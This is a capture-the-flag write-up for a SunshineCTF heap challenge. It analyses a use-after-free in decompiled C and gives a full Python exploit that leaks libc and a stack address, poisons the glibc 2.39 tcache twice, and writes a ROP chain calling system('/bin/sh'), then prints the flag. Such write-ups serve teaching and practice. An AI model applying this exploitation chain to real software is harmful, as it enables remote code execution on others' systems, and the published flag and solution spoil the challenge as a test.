# Welcome to the Jungle!
> ### Category: pwn
>
> Welcome to the Jungle, brave explorer! You’ve found yourself in the depths of a treacherous wilderness, armed with little more than a knapsack of questionable supplies and your wits. Somewhere out there, a sly genie holds the key to knowledge that could help you escape… if you can charm it right. But beware: this jungle’s full of pitfalls, lurking tigers, and hidden mysteries. Only those with a keen eye for detail (and maybe a knack for bending reality a bit) will make it out with the flag. Can you navigate the heap of pitfalls, uncover secrets, and outsmart the genie? Remember, fortune favors the bold—and sometimes the lucky!
>
> `nc 2024.sunshinectf.games 24005`
>
> ### Attachments
> `jungle.bin`
> `libc.so.6`

## Overview
In this challenge you get 25 turns during which you can:
- remove an item from one of 6 pockets (free a chunk from the heap)
- put an item in one of the pockets (optionally allocate a chunk of 0x40 bytes and write to it)
- respond to a randomly chosen danger by using an item from a given pocket (print the contents of a chunk, in one case leak the address of `printf`)

## UAF
The function for removing an item for a pocket has interesting behaviour:
```c
void remove_from_pocket(uint pocket) {
  if ((knapsack[(int)pocket] == (char *)0x0) || (used[(int)pocket] != 1)) {
    printf("<<< Pocket %d is already empty.\n",(ulong)pocket);
  }
  else {
    free(knapsack[(int)pocket]);
    printf("<<< Removed item from pocket %d.\n",(ulong)pocket);
  }
  used[(int)pocket] = (uint)(used[(int)pocket] == 0);
  return;
}
```
First of all, it leaves a dangling pointer after freeing a chunk. Second of all, it always toggles the value of `state[pocket]` - if it's called on an empty pocket, the pocket will be marked as non-empty, which will make it possible to reuse it when adding supplies or fighting dangers:
```c
if (action != 2) goto LAB_00101c24;
printf("Select a pocket to place an item in (1-6) >>> ");
__isoc99_scanf(&"%d",&pocket);
getchar();
if ((pocket < 1) || (6 < pocket)) {
    puts("<<< Invalid pocket number.");
}
else {
    printf("Enter the item name >>> ");
    iVar1 = pocket;
    if (used[pocket] == 0) {
        buf = (char *)malloc(0x40);
        knapsack[iVar1] = buf;
        used[pocket] = 1;
    }
    item_name = knapsack[pocket];
    memset(item_name,0,0x18);
    read(0,item_name,0x40);
}
```
This piece of code will not allocate a new chunk if a pocket is marked as non-empty making it possible to write to freed chunks. As for fighting dangers:
```c
void use_item_on_danger(uint pocket_idx,char *hazard) {
  int iVar1;
  
  if (used[(int)pocket_idx] == 1) {
    printf("<<< Using item from pocket %d: %s\n",(ulong)pocket_idx,knapsack[(int)pocket_idx]);
    iVar1 = strcmp(knapsack[(int)pocket_idx],"Machete");
    if ((iVar1 == 0) && (iVar1 = strcmp(hazard,"tiger"), iVar1 == 0)) {
      puts("<<< You fend off the tiger with your Machete!");
      return;
    }
    iVar1 = strcmp(knapsack[(int)pocket_idx],"Medical Kit");
    if ((iVar1 == 0) && (iVar1 = strcmp(hazard,"malaria"), iVar1 == 0)) {
      puts("<<< You treat your malaria with the Medical Kit and recover!");
      return;
    }
    iVar1 = strcmp(knapsack[(int)pocket_idx],"Compass");
    if ((iVar1 == 0) && (iVar1 = strcmp(hazard,"lost"), iVar1 == 0)) {
      puts("<<< You find your way back with the Compass!");
      return;
    }
    iVar1 = strncmp(knapsack[(int)pocket_idx],"Genie",5);
    if (iVar1 == 0) {
      printf("<<< The genie unrolls a shimmering map showing a secret starting point: %p\n",printf);
    }
    else {
      printf("<<< The %s isn\'t effective against the %s.\n",knapsack[(int)pocket_idx],hazard);
    }
  }
  else {
    printf("<<< Pocket %d is empty.",(ulong)pocket_idx);
  }
  return;
}
```
Trying to use an item that starts with `"Genie"` triggers a leak of `printf`. Using anything other than one of the items provided initially or `"Genie"` prints the contents of a heap chunk, which makes it possible to read stuff from freed chunks.

## Putting it all together
With the UAF, it's possible to poison the tcache. The idea for the exploit is:
1. Put a genie somewhere, get the address of `printf`, calculate base address of libc
2. Leak the tcache key (the challenge uses glibc 2.39, long after safe linking has been introduced)
3. Perform 1st tcache poisoning - allocate a chunk on the `environ` variable from libc and then print its contents to get a stack leak
4. Use the stack leak to calculate the address of the function's return address
5. Perform 2nd tcache poisoning - allocate a chunk on the stack, overwrite the return address with a ropchain that calls `system("/bin/sh")`
6. Use random items for however many rounds you have remaining
7. Profit :)

## The exploit
Partially written by saushouse, partially by me:
```py
from gdb_plus import *

def remove_item(i):
    io.sendlineafter(b'>>>', b'3')
    io.sendlineafter(b'>>>', f'{i}'.encode())

def read_item_name(i):
    io.sendlineafter(b'>>>', b'1')
    io.sendlineafter(b'>>>', f'{i}'.encode())
    io.recvuntil(b": ")
    res = io.recvuntil(b"\n", drop=True)
    return res

def fill(i):
    io.sendlineafter(b'>>>', b'2')
    io.sendlineafter(b'>>>', f'{i}'.encode())
    io.sendlineafter(b'>>>', cyclic(64))

def put(i, by):
    io.sendlineafter(b'>>>', b'2')
    io.sendlineafter(b'>>>', f'{i}'.encode())
    io.sendlineafter(b'>>>', by)


libc = ELF("./libc.so.6")

dbg = Debugger('./jungle.bin', script='init-gef').remote('2024.sunshinectf.games', 24005)
io = dbg.p

dbg.c(wait=False)

# use the Genie to leak printf
put(1, "Genie")
io.sendlineafter(b'>>>', b'1')
io.sendlineafter(b'>>>', b'1')
io.recvuntil(b": ")
io.recvuntil(b": ")

printf_address = int(io.recvuntil(b"\n", drop=True)[2:].decode(), 16)

libc.address = printf_address - (libc.sym['printf'] - libc.address)
log.info(f'{libc.address = :016x}')

# leak the tcache key
remove_item(1)
remove_item(1) # remove the item 2nd time to mark it as not used to make it possible to read the data from the chunk
tcache_key = read_item_name(1)

# setup for 1st tcache poisoning
remove_item(6)
remove_item(2)
remove_item(3)
remove_item(3)

tcache_int = u64(tcache_key.ljust(8, b'\0'))

aligned_offset = 0x38
r4 = tcache_int ^ (libc.sym['environ'] - aligned_offset) # allocate some bytes away from the actual target to not overwrite it accidentally

put(3, p64(r4)) # poison the fwd pointer
put(6, b"AAAA") # chunk we don't care about
put(2, f"{'B' * (aligned_offset-1)}".encode()) # the actual chunk in libc

read_item_name(2)
stack_leak = io.recvuntil(b"\n", drop=True)
stack_leak_int = u64(stack_leak.ljust(8, b'\0'))

return_address = stack_leak_int - 304 # use gdb to calculate the offset
log.info(f'{return_address = :016x}')

# setup for 2nd tcache poisoning - use some chunks that weren't used before
remove_item(6)
remove_item(5)
remove_item(4)
remove_item(4)

bin_sh = next(libc.search(b'/bin/sh'))
system = libc.sym['system']

# find those with ROPgadget
pop_rdi_ret = 0x000000000010f75b + libc.address
ret = 0x000000000002882f + libc.address

ropchain = flat(pop_rdi_ret, bin_sh, ret, system, word_size=64) # the singular `ret` in the middle is necessary to have the stack properly aligned

r5 = tcache_int ^ (return_address - 0x8) # subtract 8 because otherwise the chunk won't be aligned and tcache will be mad

put(4, p64(r5)) # poison the fwd pointer
put(6, b'CCCCC') # some chunk we don't care about
put(5, b'D' * 8 + ropchain) # chunk on the stack

# do nothing interesting for the last few rounds
for i in range(5):
    read_item_name(1)

io.interactive() # :)
```

## Flag
`sun{W3lc0m3_2Th3_Jungl3__We_h4v3_n0_fUn}`